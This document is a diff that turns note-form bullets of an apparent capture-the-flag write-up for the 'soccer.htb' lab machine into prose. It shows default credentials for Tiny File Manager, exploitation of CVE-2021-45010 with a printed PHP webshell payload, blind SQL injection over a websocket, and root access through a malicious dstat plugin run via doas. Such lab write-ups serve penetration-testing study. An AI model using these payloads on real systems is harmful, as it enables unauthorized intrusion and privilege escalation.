@@ -140,25 +140,13 @@ Sub-directories:
 301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
 ```
 
-`/tiny` -> Tiny File Manager
-
-- Checked for **default creds** in google search => `admin - admin@123`
-
-Logged in as admin and grabbed the version:
-
-- `Tiny File Manager v 2.4.3`
-- CVE-2021-45010
+`/tiny` turned out to be Tiny File Manager. A quick Google search for default creds got us in as `admin - admin@123`, and the version on display was `Tiny File Manager v 2.4.3` — vulnerable to CVE-2021-45010.
 
 > Reference:  
 > - https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
 > - https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py
 
-The script didn't work because we don't have write permission over the file it mentions.
-- Permissions can be toggled from settings — the perms of `/tiny/uploads` show it's writable
-
-Manual exploitation:
-- Navigate to the /tiny/uploads folder and click on upload
-- Intercept the request while uploading
+The public script didn't work because we didn't have write permission over the file it targets. Permissions can be toggled from the settings page though, and the perms on `/tiny/uploads` showed it was writable, so we went for manual exploitation — navigating to the uploads folder, clicking upload, and intercepting the request mid-flight.
 
 > Payload used to gain webshell
 
@@ -166,17 +154,7 @@ Manual exploitation:
 <​?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
 ```
 
-- On the `fullpath` parameter
-
----
-- To get the full **webroot** directory path, use the `upload from URL` feature => random url, intercept the request -> the error message reveals the path
----
-
-- Verified the **webroot** path contains **tiny** and **uploads** sits beside `tinyfilemanager.php`, which we can access and write to
-
-- open the uploads and upload the shell.php
-
-Once uploaded, navigate to shell.php
+We swapped the filename in the `fullpath` parameter, then used the `upload from URL` feature to leak the full **webroot** path — pointing it at a random URL and intercepting the request made the error message reveal it. The **webroot** turned out to contain **tiny**, with **uploads** sitting beside `tinyfilemanager.php`, which we could access and write to. From there it was just a matter of opening the uploads folder, uploading `shell.php`, and navigating to it.
 
 Gained shell as `www-data`
 
@@ -192,16 +170,7 @@ Revealed the subdomain of the site:
 soc-player.soccer.htb
 ```
 
-Add the subdomain to the attacker host file and navigate to it.
-
-- There is a login page - register and login
-- Navigate to tickets in the **/check** directory
-
-- There's a feature which can verify the ticket
-
-Intercept the request and check the response:
-
-- A **web socket** verifies the ticket, running on **9091**
+Add the subdomain to the attacker host file and navigate to it. There's a login page — register an account and log in, then head to tickets in the **/check** directory. A feature there can verify a ticket; intercepting the request shows the verification happens over a **websocket** running on **9091**.
 
 ---
 ### Web sockets
@@ -211,12 +180,7 @@ WebSockets enable persistent, **bidirectional communication** between a **client
 
 ---
 
-- **Intercept** or check the **WebSockets history** when we interact with the ticket and send it to the repeater
-
-- 1st tried basic math 1+1
-- next a boolean operation
-
-Boolean worked — we know it's blind.
+We **intercepted** the **WebSocket history** when interacting with the ticket and sent it to the repeater. First we tried basic math (1+1), then a boolean operation. The boolean worked — so we knew it was blind.
 
 #### sqlmap
 
@@ -248,19 +212,17 @@ Gained ssh shell as user **player**
 find / -perm -4000 -exec ls -al {} \; 2>/dev/null
 ```
 
-No sudo — not in the **sudoers list**, but there's a similar binary: **doas**
+No sudo — we're not in the **sudoers list**, but there's a similar binary: **doas**
 
 ## doas
 
-**doas** has **SUID** permission — it does a similar job to **sudo**:
+**doas** has **SUID** permission and does a similar job to **sudo**:
 
 ```sh
 /usr/local/bin/doas
 ```
 
-Checked the documentation of `doas`:
-
-`/etc/doas.conf` - acts as `sudo -l`:
+Checking the `doas` documentation, `/etc/doas.conf` acts as `sudo -l`:
 
 ```sh
 cat /usr/local/etc/doas.conf 
@@ -280,9 +242,7 @@ This binary can be executed as root:
 ls -dl /usr/local/share/dstat/
 ```
 
-- `d` - Only list directory permission
-
-We found a directory writable by player.
+The `d` flag lists only the directory permission itself, and it showed a directory writable by player.
 
 Create a **dstat_xxx.py** file under it:
 
@@ -294,7 +254,7 @@ echo 'import os; os.execl("/bin/sh", "sh")' > dstat_xxx.py
 doas /usr/bin/dstat --list 
 ```
 
-- Confirms the file was picked up — `xxx` shows up as a plugin option
+Confirms the file was picked up — `xxx` shows up as a plugin option
 
 ```sh
 doas /usr/bin/dstat --xxx
